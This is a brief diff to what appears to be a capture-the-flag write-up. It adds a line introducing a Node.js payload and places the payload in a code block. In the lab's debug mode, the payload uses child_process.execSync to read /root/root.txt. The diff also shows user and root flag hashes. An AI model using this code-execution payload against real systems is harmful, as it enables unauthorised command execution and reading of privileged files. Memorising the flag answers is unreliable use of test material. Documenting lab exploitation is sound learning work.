@@ -73,6 +73,8 @@ USER FLAG - 2ee9a75503b53fdeab129b84f36869c7
 
 <img width="883" height="89" alt="image" src="https://github.com/user-attachments/assets/0e3e5a9a-3f8b-4066-8f60-5736dc1af52e" />
 
+whilst in the debug mode we use the following:
+```
 exec('process.mainModule.require("child_process").execSync("cat /root/root.txt").toString()')
-
+```
 ROOT FLAG - 8ddc9db4346411a26a9c12d4902851ea
